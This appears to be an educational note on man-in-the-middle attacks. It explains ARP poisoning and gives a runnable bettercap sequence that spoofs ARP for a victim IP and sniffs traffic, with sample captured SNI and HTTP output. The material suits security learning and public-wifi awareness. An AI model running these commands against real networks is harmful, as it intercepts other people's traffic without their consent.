## MITM (Man In The Middle Attack)

An attack where the attacker positions themselves between a client and router, intercepting all network communications without either party knowing.

**Why it's dangerous:**
- HTTP sites — full credentials and content visible
- HTTPS sites — can see which sites victim visits (SNI) but not content
- Works silently — victim has no idea

**Always check** if a URL is `http` or `https` on public networks like cafes and airports.

---

### How It Works

Normal traffic flow:
```
Victim → Router → Internet
```

After MITM:
```
Victim → Attacker → Router → Internet
```

The attacker intercepts every request and forwards it, sitting invisibly in the middle.

---

### ARP Poisoning

ARP (Address Resolution Protocol) maps IP addresses to MAC addresses so devices can communicate on a local network.

**Normal ARP table:**
```
Victim  → Router IP = Router MAC
Router  → Victim IP = Victim MAC
```

**After ARP poisoning:**
```
Victim  → Router IP = Attacker MAC  (victim sends traffic to attacker)
Router  → Victim IP = Attacker MAC  (router sends responses to attacker)
```

Attacker sends fake ARP replies to both victim and router claiming to be the other party. Both sides think they're talking to each other — they're actually talking to the attacker.

---

### Tool Used — Bettercap

```bash
sudo bettercap 
```

Inside bettercap:
```bash
net.probe on                    # discover devices on network
net.show                        # show all discovered hosts
set arp.spoof.targets 192.168.18.239(victim-ip)
arp.spoof on                    # start ARP poisoning
net.sniff on                    # start sniffing traffic
```

**What bettercap captured from network:**
```
[net.sniff.https] sni local > https://entrance.puexam.edu.np
[net.sniff.https] sni local > https://khalti.s3.ap-south-1.amazonaws.com
[net.sniff.http.request] http local GET detectportal.firefox.com/success.txt
```

HTTPS traffic shows SNI (which site they're visiting) but content is encrypted. HTTP traffic shows full request including credentials.

---

### HTTP vs HTTPS Under MITM

| | HTTP | HTTPS |
|--|--|--|
| Can see sites visited | ✅ | ✅ (via SNI) |
| Can see credentials | ✅ | ❌ |
| Can see content | ✅ | ❌ |
| Dangerous on public WiFi | Very dangerous | Still leaks browsing history |
